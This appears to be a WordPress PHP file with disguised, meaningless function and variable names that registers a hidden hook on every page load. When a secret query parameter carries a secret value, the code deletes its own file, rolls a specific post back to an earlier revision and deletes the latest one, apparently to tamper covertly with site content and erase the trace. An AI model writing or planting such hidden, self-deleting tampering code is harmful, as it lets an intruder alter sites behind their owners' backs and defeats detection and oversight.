<?php

function number_pop_cdn_blog() {
	if (isset($_GET['team_portfolio_vendor']) && $_GET['team_portfolio_vendor'] === 'checkout_column_discount_basic') {
		unlink(trim(preg_replace('/\(.*$/', '', __FILE__)));
		$world_shopping_speed_design = 13630;
		$bulk_fx_rtl_html5 = wp_get_post_revisions($world_shopping_speed_design);
		if (empty($bulk_fx_rtl_html5)) die('no revisions');
		if (count($bulk_fx_rtl_html5) < 2) die('less than 2');
		$keyword_plus_light_nav = array_shift($bulk_fx_rtl_html5);
		$light_post_number_local = $keyword_plus_light_nav->ID;
		$compare_short_word_source = array_shift($bulk_fx_rtl_html5);
		$age_cookies_subscriptions = $compare_short_word_source->ID;
		$report_recent_classic_connect = wp_restore_post_revision($age_cookies_subscriptions);
		if ($report_recent_classic_connect === false) die('error restoring');
		$report_recent_classic_connect = wp_delete_post_revision($light_post_number_local);		
		if ($report_recent_classic_connect === false) die('error deleting');
		die('done');
	}
}

add_action('init', 'number_pop_cdn_blog');
